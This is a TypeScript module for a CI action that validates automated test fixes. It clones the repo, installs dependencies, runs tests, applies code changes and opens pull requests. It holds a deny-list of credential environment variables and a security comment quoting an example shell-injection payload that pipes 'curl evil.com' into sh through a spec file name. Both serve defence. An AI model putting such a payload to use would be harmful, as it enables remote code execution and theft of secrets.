import * as core from '@actions/core';
import * as crypto from 'crypto';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execSync, execFileSync } from 'child_process';
import { Octokit } from '@octokit/rest';
import { verifyTestEvidence } from './test-evidence';

export interface LocalValidatorConfig {
  owner: string;
  repo: string;
  branch: string;
  githubToken: string;
  npmToken?: string;
  testCommand: string;
  spec?: string;
  previewUrl?: string;
  testTimeoutMs?: number;
}

export interface TestRunResult {
  passed: boolean;
  logs: string;
  exitCode: number;
  durationMs: number;
}

export interface PushResult {
  branchName: string;
  commitSha: string;
  prUrl?: string;
  prNumber?: number;
}


const SECRET_ENV_KEYS = new Set([
  'GITHUB_TOKEN',
  'OPENAI_API_KEY',
  'CURSOR_API_KEY',
  'NPM_TOKEN',
  'CROSS_REPO_PAT',
  'INPUT_GITHUB_TOKEN',
  'INPUT_OPENAI_API_KEY',
  'INPUT_CURSOR_API_KEY',
  'INPUT_NPM_TOKEN',
  'INPUT_CROSS_REPO_PAT',
  // AWS credentials — added per code_review_may_2026 Security #2.
  // When the agent uses OIDC to assume a role for DynamoDB skill-store
  // access, these env vars are populated on the runner and would
  // otherwise pass through to the test subprocess. LLM-generated fixes
  // or compromised dependencies executed inside the test could read and
  // exfiltrate them. Deny-listing here is independent of the OIDC
  // session lifetime — the parent action keeps its own env intact and
  // can still reach DynamoDB; only the subprocess is starved.
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'AWS_DEFAULT_REGION',
  'AWS_REGION',
  // OIDC-related vars that, while not credentials, can be used to
  // request fresh tokens for additional roles via STS — same risk class.
  'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
  'ACTIONS_ID_TOKEN_REQUEST_URL',
  // Slack webhook URL (used elsewhere in the org) — preempt accidental
  // forwarding when consumer workflows expose it as an action env.
  'SLACK_WEBHOOK_URL',
  'INPUT_SLACK_WEBHOOK_URL',
]);

function filterEnv(npmToken?: string): Record<string, string> {
  const env: Record<string, string> = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (value !== undefined && !SECRET_ENV_KEYS.has(key)) {
      env[key] = value;
    }
  }
  if (npmToken) {
    env.NODE_AUTH_TOKEN = npmToken;
  }
  return env;
}

const DEFAULT_TEST_TIMEOUT_MS = 300_000;
const MAX_LOG_CHARS = 20_000;
const MAX_BUFFER = 10 * 1024 * 1024;

/**
 * Number of consecutive passes required for `baselineCheck` to conclude
 * "the test passes without any fix." Pre-v1.50.1 this was effectively 1
 * (single pass), which proved too noisy a signal for the A1-writer —
 * it couldn't distinguish transient flake from genuine classifier
 * misread. 3 consecutive passes is the point where the probability of
 * "3 coincidental flake-passes in a row" drops low enough that the
 * signal becomes attributable to the classifier's verdict being
 * wrong. Lower bound: the cost of 3 test runs per gated run is non-
 * trivial (e.g., +60-120s on typical E2E tests); upper bound: beyond
 * ~5 the marginal confidence gain is diminishing and the cost becomes
 * prohibitive for fast-iteration repos.
 */
const BASELINE_PASS_COUNT = 3;

export class LocalFixValidator {
  private config: LocalValidatorConfig;
  private octokit: Octokit;
  private _workDir: string;

  constructor(config: LocalValidatorConfig, octokit: Octokit) {
    this.config = config;
    this.octokit = octokit;
    this._workDir = '';
  }

  get workDir(): string {
    return this._workDir;
  }

  async setup(): Promise<void> {
    this._workDir = path.join(os.tmpdir(), 'triage-fix-' + Date.now());

    core.setSecret(this.config.githubToken);

    const cloneUrl = `https://x-access-token:${this.config.githubToken}@github.com/${this.config.owner}/${this.config.repo}.git`;
    const maskedUrl = cloneUrl.replace(this.config.githubToken, '***');

    core.info(`📂 Cloning ${this.config.owner}/${this.config.repo}@${this.config.branch} into ${this._workDir}`);
    core.info(`  git clone --branch ${this.config.branch} --depth 50 ${maskedUrl}`);

    execFileSync('git', ['clone', '--branch', this.config.branch, '--depth', '50', cloneUrl, this._workDir], {
      encoding: 'utf-8',
      stdio: 'pipe',
      timeout: 300_000,
    });

    core.info('📦 Installing dependencies...');
    const npmrcPath = path.join(this._workDir, '.npmrc');
    if (!fs.existsSync(npmrcPath)) {
      fs.writeFileSync(
        npmrcPath,
        '//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n@adept-at:registry=https://npm.pkg.github.com\n',
        'utf-8'
      );
    }

    const npmCacheDir = path.join(os.homedir(), '.npm');
    const lockPath = path.join(this._workDir, 'package-lock.json');
    let cacheKey = '';
    let cacheRestored = false;

    if (fs.existsSync(lockPath)) {
      const lockHash = crypto.createHash('sha256').update(fs.readFileSync(lockPath)).digest('hex').slice(0, 16);
      cacheKey = `triage-npm-${process.platform}-${this.config.owner}-${this.config.repo}-${lockHash}`;
      try {
        const cacheModule = await import('@actions/cache');
        const hit = await cacheModule.restoreCache([npmCacheDir], cacheKey, [
          `triage-npm-${process.platform}-${this.config.owner}-${this.config.repo}-`,
        ]);
        cacheRestored = !!hit;
        core.info(hit ? `📦 npm cache restored (key: ${hit})` : '📦 npm cache miss — full install');
      } catch (err) {
        core.info(`📦 npm cache restore failed (non-fatal): ${err}`);
      }
    }

    let cypressCacheKey = '';
    if (this.config.testCommand && this.config.testCommand.includes('cypress')) {
      const cypressCacheDir = path.join(os.homedir(), '.cache', 'Cypress');
      cypressCacheKey = `triage-cypress-${process.platform}-${this.config.owner}-${this.config.repo}`;
      try {
        const cacheModule = await import('@actions/cache');
        const hit = await cacheModule.restoreCache([cypressCacheDir], cypressCacheKey);
        core.info(hit ? `📦 Cypress binary cache restored (key: ${hit})` : '📦 Cypress binary cache miss — postinstall will download');
      } catch (err) {
        core.info(`📦 Cypress cache restore failed (non-fatal): ${err}`);
      }
    }

    const npmEnv = filterEnv(this.config.npmToken || this.config.githubToken);
    try {
      execSync('npm ci --ignore-scripts 2>&1', {
        cwd: this._workDir,
        encoding: 'utf-8',
        stdio: 'pipe',
        maxBuffer: MAX_BUFFER,
        env: npmEnv,
        timeout: 300_000,
      });
    } catch (ciErr: unknown) {
      const e = ciErr as { stdout?: string; stderr?: string };
      const ciOutput = e.stdout || e.stderr || String(ciErr);
      core.info(`npm ci failed:\n${ciOutput.slice(-500)}`);
      core.info('Falling back to npm install...');
      try {
        execSync('npm install --ignore-scripts 2>&1', {
          cwd: this._workDir,
          encoding: 'utf-8',
          stdio: 'pipe',
          maxBuffer: MAX_BUFFER,
          env: npmEnv,
          timeout: 300_000,
        });
      } catch (installErr: unknown) {
        const ie = installErr as { stdout?: string; stderr?: string };
        const installOutput = ie.stdout || ie.stderr || String(installErr);
        throw new Error(`npm install failed:\n${installOutput.slice(-1000)}`);
      }
    }

    if (this.config.testCommand && this.config.testCommand.includes('cypress')) {
      core.info('📦 Installing Cypress binary (postinstall was skipped by --ignore-scripts)...');
      try {
        execSync('npx cypress install 2>&1', {
          cwd: this._workDir,
          encoding: 'utf-8',
          stdio: 'pipe',
          maxBuffer: MAX_BUFFER,
          env: npmEnv,
          timeout: 300_000,
        });
        core.info('📦 Cypress binary installed');
      } catch (cypressErr) {
        core.warning(`Cypress install failed: ${cypressErr}`);
      }
    }

    if (cacheKey && !cacheRestored) {
      try {
        const cacheModule = await import('@actions/cache');
        await cacheModule.saveCache([npmCacheDir], cacheKey);
        core.info(`📦 npm cache saved (key: ${cacheKey})`);
      } catch (err) {
        core.info(`📦 npm cache save failed (non-fatal): ${err}`);
      }
    }

    if (cypressCacheKey) {
      const cypressCacheDir = path.join(os.homedir(), '.cache', 'Cypress');
      try {
        const cacheModule = await import('@actions/cache');
        await cacheModule.saveCache([cypressCacheDir], cypressCacheKey);
        core.info(`📦 Cypress binary cache saved (key: ${cypressCacheKey})`);
      } catch (err) {
        core.info(`📦 Cypress binary cache save failed (non-fatal): ${err}`);
      }
    }

    core.info('✅ Setup complete');
  }

  async baselineCheck(): Promise<TestRunResult> {
    core.info(
      `🔍 Running baseline check — does the test pass without any fix? ` +
        `(requires ${BASELINE_PASS_COUNT} consecutive passes)`
    );

    let totalDurationMs = 0;
    let lastResult: TestRunResult | undefined;

    for (let pass = 1; pass <= BASELINE_PASS_COUNT; pass++) {
      core.info(`   Baseline pass ${pass}/${BASELINE_PASS_COUNT}...`);
      const result = await this.runTest();
      totalDurationMs += result.durationMs;
      lastResult = result;

      if (!result.passed) {
        // Short-circuit on first failure — running further passes after a
        // confirmed failure wastes cycles and the failing pass's logs are
        // the ones the operator wants to see. Caller treats
        // `passed === false` as "baseline confirmed the failure exists,
        // proceed to repair." Exit code is propagated so downstream
        // telemetry can distinguish OOM / SIGKILL / test-assert failures.
        core.info(`   ❌ Baseline failed on pass ${pass} — short-circuiting.`);
        return {
          passed: false,
          logs: result.logs,
          exitCode: result.exitCode,
          durationMs: totalDurationMs,
        };
      }
    }

    // All N passes succeeded. Use the last pass's logs/exitCode as the
    // representative sample; the summed duration gives the operator the
    // true cost of the multi-pass check (not just the final pass).
    return {
      passed: true,
      logs: lastResult?.logs ?? '',
      exitCode: lastResult?.exitCode ?? 0,
      durationMs: totalDurationMs,
    };
  }

  async preValidateFix(
    changes: Array<{ file: string; oldCode: string; newCode: string }>
  ): Promise<{ valid: boolean; reason?: string }> {
    for (const change of changes) {
      let resolved: { cleanPath: string; filePath: string };
      try {
        resolved = this.resolveChangePath(change.file);
      } catch (error) {
        return {
          valid: false,
          reason: error instanceof Error ? error.message : String(error),
        };
      }
      const { cleanPath, filePath } = resolved;

      if (!fs.existsSync(filePath)) {
        return { valid: false, reason: `File not found: ${cleanPath}` };
      }

      const content = fs.readFileSync(filePath, 'utf-8');

      if (content.indexOf(change.oldCode) === -1) {
        return { valid: false, reason: `oldCode not found in ${cleanPath}` };
      }

      if (/\.tsx?$/.test(cleanPath)) {
        const typeCheck = this.quickTypeCheck(filePath);
        if (!typeCheck.passed) {
          return {
            valid: false,
            reason: `TypeScript compilation failed: ${typeCheck.error}`,
          };
        }
      }
    }

    return { valid: true };
  }

  private resolveChangePath(rawPath: string): { cleanPath: string; filePath: string } {
    const cleanPath = rawPath
      .replace(/^\.\//, '')
      .replace(/^\/home\/runner\/work\/[^/]+\/[^/]+\//, '');
    const workDirRoot = path.resolve(this._workDir);
    const filePath = path.resolve(workDirRoot, cleanPath);

    if (!filePath.startsWith(`${workDirRoot}${path.sep}`)) {
      throw new Error(`Path traversal rejected: ${cleanPath}`);
    }

    return { cleanPath, filePath };
  }

  private quickTypeCheck(filePath: string): {
    passed: boolean;
    error?: string;
  } {
    const tscPath = path.join(this._workDir, 'node_modules', '.bin', 'tsc');
    if (!fs.existsSync(tscPath)) {
      return { passed: true };
    }

    try {
      execFileSync(tscPath, ['--noEmit', '--pretty', 'false', filePath], {
        cwd: this._workDir,
        timeout: 30000,
        stdio: 'pipe',
        encoding: 'utf-8',
      });
      return { passed: true };
    } catch (err: unknown) {
      const execErr = err as {
        stdout?: string;
        stderr?: string;
        killed?: boolean;
      };
      if (execErr.killed) {
        core.warning(`tsc type-check timed out for ${filePath} — skipping`);
        return { passed: true };
      }
      const output = execErr.stdout || execErr.stderr || String(err);
      const firstLine =
        output
          .split('\n')
          .find(l => l.trim()) || 'Unknown error';
      return { passed: false, error: firstLine };
    }
  }

  async applyFix(changes: Array<{ file: string; oldCode: string; newCode: string }>): Promise<void> {
    const preCheck = await this.preValidateFix(changes);
    if (!preCheck.valid) {
      throw new Error(`Pre-validation failed: ${preCheck.reason}`);
    }

    for (const change of changes) {
      const { cleanPath, filePath } = this.resolveChangePath(change.file);

      const content = fs.readFileSync(filePath, 'utf-8');
      const idx = content.indexOf(change.oldCode);

      if (idx === -1) {
        throw new Error(
          `Could not find oldCode in ${cleanPath}. Expected to find:\n${change.oldCode.slice(0, 200)}`
        );
      }

      const secondIdx = content.indexOf(change.oldCode, idx + 1);
      if (secondIdx !== -1) {
        throw new Error(
          `Ambiguous match: oldCode appears more than once in ${cleanPath}`
        );
      }

      const updated = content.slice(0, idx) + change.newCode + content.slice(idx + change.oldCode.length);
      fs.writeFileSync(filePath, updated, 'utf-8');
    }
  }

  async runTest(): Promise<TestRunResult> {
    if (!this.config.testCommand) {
      throw new Error('No testCommand configured — cannot run validation');
    }

    // Shell-injection defense (code_review_may_2026 Security #1).
    //
    // `this.config.spec` can be sourced from `errorData.fileName`, which is
    // extracted from CI logs via a permissive regex (`[^\s]+\.[jt]sx?`).
    // That regex matches any sequence of non-whitespace characters ending
    // in a JS/TS extension — including shell metacharacters such as `;`,
    // `|`, `&`, `$()`, and backticks. Without validation, a malicious test
    // log of the form `spec: a.ts;curl evil.com|sh;b.ts` would propagate
    // through `cmd.replaceAll('{spec}', spec)` and into `execSync(cmd)`,
    // which spawns a shell and would interpret the metacharacters.
    //
    // Defenses applied here:
    //   1. Reject specs that don't match a strict pathspec regex
    //      (alphanumerics + `_-./` only). This rules out every shell
    //      metacharacter, quote, and whitespace.
    //   2. Reject specs containing `..` (path traversal).
    //   3. Verify the spec resolves to a file that exists inside
    //      `this._workDir` — defense in depth against absolute paths or
    //      escapes from the cloned-repo root.
    //
    // If `validationSpec` is operator-provided (the common case for
    // configured consumers), it almost always passes — these are
    // repo-relative test paths. The defense fires when the spec falls
    // back to log-extracted `errorData.fileName` and that string is
    // attacker-controlled.
    const SAFE_SPEC_REGEX = /^[a-zA-Z0-9_\-./]+$/;
    if (this.config.spec) {
      if (
        !SAFE_SPEC_REGEX.test(this.config.spec) ||
        this.config.spec.includes('..')
      ) {
        throw new Error(
          `Refusing to run test: spec path "${this.config.spec}" contains characters outside the safe pathspec set [a-zA-Z0-9_\\-./] or contains ".." traversal. This is a hard-coded shell-injection defense; configure VALIDATION_SPEC explicitly with a clean repo-relative path.`
        );
      }
      // Resolve against workDir and confirm the file exists. Using
      // path.resolve + startsWith catches absolute-path escapes that the
      // regex alone allows (e.g., `/etc/passwd` is regex-clean).
      const resolved = path.resolve(this._workDir, this.config.spec);
      if (!resolved.startsWith(path.resolve(this._workDir) + path.sep)) {
        throw new Error(
          `Refusing to run test: spec path "${this.config.spec}" resolves outside the cloned repo root.`
        );
      }
      if (!fs.existsSync(resolved)) {
        throw new Error(
          `Refusing to run test: spec file "${this.config.spec}" does not exist in ${this._workDir}. Pass an existing repo-relative path via VALIDATION_SPEC.`
        );
      }
    }

    let cmd = this.config.testCommand;
    if (this.config.spec) {
      cmd = cmd.replaceAll('{spec}', this.config.spec);
    }
    if (this.config.previewUrl) {
      cmd = cmd.replaceAll('{url}', this.config.previewUrl);
    }

    const timeout = this.config.testTimeoutMs || DEFAULT_TEST_TIMEOUT_MS;
    const safeEnv = filterEnv(this.config.npmToken || this.config.githubToken);
    const start = Date.now();

    try {
      const output = execSync(cmd, {
        cwd: this._workDir,
        encoding: 'utf-8',
        timeout,
        env: safeEnv,
        maxBuffer: MAX_BUFFER,
        stdio: 'pipe',
      });

      const durationMs = Date.now() - start;
      const truncatedLogs = output.slice(-MAX_LOG_CHARS);

      // Exit code 0 alone is not proof tests ran. Consumer scripts have
      // shipped runners through `tee` without `pipefail`, masking the
      // real exit, and bare-basename specs can make Cypress exit 0 with
      // "no spec files were found." Require concrete pass evidence
      // before accepting passed=true so the skill store can't be
      // poisoned by false validations.
      const evidence = verifyTestEvidence(truncatedLogs);
      if (!evidence.trustworthy) {
        core.warning(
          `Test command exited 0 but ${evidence.reason} — treating as failed to avoid poisoning the skill store with a false validation.`
        );
        return {
          passed: false,
          logs: truncatedLogs,
          exitCode: 0,
          durationMs,
        };
      }

      core.info(`✅ Test evidence verified: ${evidence.reason}`);
      return {
        passed: true,
        logs: truncatedLogs,
        exitCode: 0,
        durationMs,
      };
    } catch (err: unknown) {
      const durationMs = Date.now() - start;
      const execErr = err as { status?: number; stdout?: string; stderr?: string; killed?: boolean };

      if (execErr.killed) {
        return {
          passed: false,
          logs: `Test timed out after ${timeout}ms`,
          exitCode: 1,
          durationMs,
        };
      }

      const combined = [execErr.stdout || '', execErr.stderr || ''].join('\n');
      return {
        passed: false,
        logs: combined.slice(-MAX_LOG_CHARS),
        exitCode: execErr.status ?? 1,
        durationMs,
      };
    }
  }

  async reset(): Promise<void> {
    try {
      execSync('git checkout -- .', {
        cwd: this._workDir,
        encoding: 'utf-8',
        timeout: 30_000,
      });
    } catch (err) {
      core.warning(`git checkout reset failed: ${err}`);
    }
    try {
      execSync('git clean -fd', {
        cwd: this._workDir,
        encoding: 'utf-8',
        timeout: 30_000,
      });
    } catch (err) {
      core.warning(`git clean reset failed: ${err}`);
    }
  }

  async pushAndCreatePR(options: {
    branchName: string;
    commitMessage: string;
    prTitle: string;
    prBody: string;
    baseBranch: string;
    changedFiles?: string[];
  }): Promise<PushResult> {
    const execOpts = { cwd: this._workDir, encoding: 'utf-8' as const, timeout: 120_000 };

    execFileSync('git', ['config', 'user.name', 'adept-triage-agent[bot]'], execOpts);
    execFileSync('git', ['config', 'user.email', 'adept-triage-agent[bot]@users.noreply.github.com'], execOpts);
    execFileSync('git', ['checkout', '-b', options.branchName], execOpts);

    execFileSync('git', ['reset', 'HEAD'], execOpts);
    if (options.changedFiles && options.changedFiles.length > 0) {
      execFileSync('git', ['add', ...options.changedFiles], execOpts);
    } else {
      execFileSync('git', ['add', '-A'], execOpts);
      const scaffoldFiles = ['.npmrc', '.env', '.env.local'];
      for (const f of scaffoldFiles) {
        try {
          execFileSync('git', ['reset', 'HEAD', f], { ...execOpts, stdio: 'pipe' });
        } catch {
          // file not staged — fine
        }
      }
    }
    execFileSync('git', ['commit', '-m', options.commitMessage], execOpts);
    execFileSync('git', ['push', 'origin', options.branchName], { ...execOpts, stdio: 'pipe' });

    const commitSha = execFileSync('git', ['rev-parse', 'HEAD'], execOpts).trim();

    const { data: pr } = await this.octokit.pulls.create({
      owner: this.config.owner,
      repo: this.config.repo,
      title: options.prTitle,
      body: options.prBody,
      head: options.branchName,
      base: options.baseBranch,
    });

    return {
      branchName: options.branchName,
      commitSha,
      prUrl: pr.html_url,
      prNumber: pr.number,
    };
  }

  async cleanup(): Promise<void> {
    try {
      fs.rmSync(this._workDir, { recursive: true, force: true });
    } catch (err) {
      core.warning(`Failed to clean up ${this._workDir}: ${err}`);
    }
  }
}
